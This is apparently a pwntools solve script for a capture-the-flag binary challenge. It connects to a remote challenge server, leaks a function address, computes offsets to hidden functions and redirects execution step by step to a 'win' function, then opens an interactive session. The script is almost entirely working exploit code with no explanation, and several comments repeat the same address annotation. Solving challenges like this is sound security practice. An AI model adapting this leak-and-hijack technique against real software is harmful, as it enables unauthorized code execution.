from pwn import *


# p = process('./death_star_computer.bin')
# gdb.attach(p, gdbscript='b *main+290')
# input()

p = remote("spaceheroes-death-star.chals.io", 443, ssl=True, sni="spaceheroes-death-star.chals.io")
# p.interactive()

print(p.recv().decode(errors="ignore"))
p.sendline(b'1') # set target
print(p.recv().decode(errors="ignore"))
p.sendline(b'2') # set yavin_4 as target
print(p.recv().decode(errors="ignore"))
p.sendline(b'2') # print address of yavin_4
p.recvuntil(b'Target Coordinates => ')

yavin_4_addr = int(p.recvuntil(b'\n')[:-1])
ignore_me_addr = yavin_4_addr + 432
win_addr = yavin_4_addr + 463

print(f"yavin_4 address is: {hex(yavin_4_addr)}")
print(f"win address is: {hex(win_addr)}")
print(f"ignore_me address is: {hex(ignore_me_addr)}")

p.sendline(b'1') # set target
print(p.recv().decode(errors="ignore"))
p.sendline(str(ignore_me_addr + 4).encode()) # set target to 0x56166c0fb51f <ignore_me()+4>  mov    r14, 0x4b
print()
print(p.recv().decode(errors="ignore"))
p.sendline(b'3')
print(p.recv().decode(errors="ignore"))

p.sendline(b'1') # set target
print(p.recv().decode(errors="ignore"))
p.sendline(str(ignore_me_addr + 12).encode()) # set target to 0x56166c0fb51f <ignore_me()+4>  mov    r14, 0x4b
print()
print(p.recv().decode(errors="ignore"))
p.sendline(b'3')
print(p.recv().decode(errors="ignore"))

p.sendline(b'1') # set target
print(p.recv().decode(errors="ignore"))
p.sendline(str(ignore_me_addr + 20).encode()) # set target to 0x56166c0fb51f <ignore_me()+4>  mov    r14, 0x4b
print()
print(p.recv().decode(errors="ignore"))
p.sendline(b'3')
print(p.recv().decode(errors="ignore"))

p.sendline(b'1') # set target
print(p.recv().decode(errors="ignore"))
p.sendline(str(win_addr).encode()) # set target to 0x56166c0fb51f <ignore_me()+4>  mov    r14, 0x4b
print()
print(p.recv().decode(errors="ignore"))
p.sendline(b'3')
p.interactive()
